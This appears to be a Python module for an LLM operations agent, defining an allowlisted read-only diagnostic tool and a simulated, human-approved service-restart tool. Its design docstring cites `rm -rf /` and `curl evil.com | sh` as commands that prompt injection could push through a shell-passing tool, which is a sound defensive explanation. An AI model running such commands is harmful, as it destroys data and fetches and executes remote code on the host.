"""工具：诊断脚本与危险操作。

这是整个系统里安全风险最高的地方，设计上有两条铁律：

**铁律一：模型只能选脚本 ID，不能传命令。**

    LLM 生成的参数是**不可信输入**。如果工具签名是 run_diagnostic("df -h")，
    那么模型（或者通过提示注入攻击的用户）可以直接让它执行
    `rm -rf /` 或 `curl evil.com | sh`。任何「把模型输出拼进 shell」的设计
    都是漏洞，不管在 prompt 里写多少遍「不要执行危险命令」都没用。

    所以命令完全写死在白名单字典里，模型只能在 enum 里挑一个 ID。
    攻击面从「任意命令」收缩到「这五个预定义脚本」，这是可以审计的。

**铁律二：不可逆操作必须人工审批。**

    只读命令（df / ps / 查日志）可以自动执行，风险可控。
    重启服务、清理磁盘这类会改变系统状态的操作，必须在执行前挂起，
    等人确认。这在 LangGraph 里用 interrupt() 实现，见 nodes/executor.py。

    demo 里「Agent 可以随便调工具」，线上不行。这条界线就是能不能上生产的差别。
"""

import os
import platform
import subprocess
from typing import Any, Dict, List

from .registry import register

TIMEOUT_SECONDS = 5
MAX_OUTPUT_CHARS = 2000

# 白名单：ID -> 命令。命令是固定列表，不经过 shell，无法注入。
_IS_MAC = platform.system() == "Darwin"
_SCRIPT_WHITELIST: Dict[str, Dict[str, Any]] = {
    "disk_usage": {
        "cmd": ["df", "-h"],
        "desc": "查看磁盘分区使用率",
    },
    "top_cpu_processes": {
        "cmd": ["ps", "-Ao", "pid,comm,%cpu"] + ([] if _IS_MAC else ["--sort=-%cpu"]),
        "desc": "占用 CPU 最高的进程",
        "post_limit": 15,
    },
    "large_log_files": {
        "cmd": ["du", "-sh", "/var/log"],
        "desc": "统计日志目录占用",
        "optional": True,
    },
    "listening_ports": {
        "cmd": ["lsof", "-nP", "-iTCP", "-sTCP:LISTEN"],
        "desc": "查看监听端口",
        "post_limit": 20,
    },
}


def _run_fixed(cmd: List[str]) -> subprocess.CompletedProcess:
    """执行固定命令。

    shell=False 是关键：命令以参数数组传入，shell 不参与解析，
    因此即使参数里含 `;` `|` `$()` 也不会被当成命令分隔符。
    """
    return subprocess.run(
        cmd, shell=False, timeout=TIMEOUT_SECONDS,
        capture_output=True, text=True, errors="replace",
    )


@register(
    name="run_diagnostic",
    description="执行预置的只读诊断脚本，获取系统当前状态。"
                "只能选择白名单中的脚本 ID，不能执行任意命令。",
    parameters={
        "type": "object",
        "properties": {
            "script_id": {
                "type": "string",
                "description": "诊断脚本 ID",
                "enum": list(_SCRIPT_WHITELIST.keys()),
            },
        },
        "required": ["script_id"],
    },
    tags=["readonly", "system"],
)
def run_diagnostic(script_id: str) -> Dict[str, Any]:
    spec = _SCRIPT_WHITELIST.get(script_id)
    if spec is None:
        return {"ok": False, "error": f"未授权的脚本: {script_id}"}

    try:
        proc = _run_fixed(spec["cmd"])
    except subprocess.TimeoutExpired:
        return {"ok": False, "script": script_id,
                "error": f"执行超时（>{TIMEOUT_SECONDS}s）"}
    except FileNotFoundError as e:
        return {"ok": False, "script": script_id,
                "error": f"命令不存在: {e}", "optional": spec.get("optional", False)}

    out = (proc.stdout or "").strip()
    if spec.get("post_limit"):
        out = "\n".join(out.splitlines()[: spec["post_limit"]])
    truncated = len(out) > MAX_OUTPUT_CHARS
    out = out[:MAX_OUTPUT_CHARS]

    return {
        "ok": proc.returncode == 0,
        "script": script_id,
        "description": spec["desc"],
        "output": out,
        "truncated": truncated,
        "stderr": (proc.stderr or "")[:300],
        # 明确标注执行环境：生产实现会 SSH 到目标主机执行，
        # 演示环境跑在本地，数据自然和目标主机的监控指标对不上。
        # 不写这一句，模型会拿两边数据硬凑一个因果解释。
        "executed_on": "local-demo-host (本机，非目标主机)",
    }


# ---- 危险操作单独成一个工具 ----
# 为什么不塞进 run_diagnostic：
#   工具的粒度决定审批的粒度。如果把 restart 混在诊断工具里，
#   registry 层面就无法区分「这次调用要不要审批」，
#   只能靠模型自己判断——而模型是不可信的。

_SERVICES = ["nginx", "mysql", "redis", "app-worker"]


@register(
    name="restart_service",
    description="重启指定系统服务。这是会中断线上流量的操作，"
                "调用后需要人工确认才会真正执行。",
    parameters={
        "type": "object",
        "properties": {
            "service": {
                "type": "string",
                "description": "服务名",
                "enum": _SERVICES,
            },
            "reason": {
                "type": "string",
                "description": "重启原因，会写入工单和审计日志",
            },
        },
        "required": ["service", "reason"],
    },
    dangerous=True,
    risk_note="重启服务会中断该服务上的所有连接，可能影响线上用户。",
    tags=["write", "system", "irreversible"],
)
def restart_service(service: str, reason: str) -> Dict[str, Any]:
    """演示环境不真的重启，只记录。

    真实实现会调用 supervisorctl / systemctl，但这里故意留空——
    一个能真的重启服务的 Agent 不应该在演示环境里跑起来。
    面试时可以讲这个取舍：能力边界要显式，能做的事和该做的事分开。
    """
    return {
        "ok": True,
        "simulated": True,
        "service": service,
        "reason": reason,
        "message": f"（演示模式）已提交重启 {service} 的请求，实际未执行",
    }
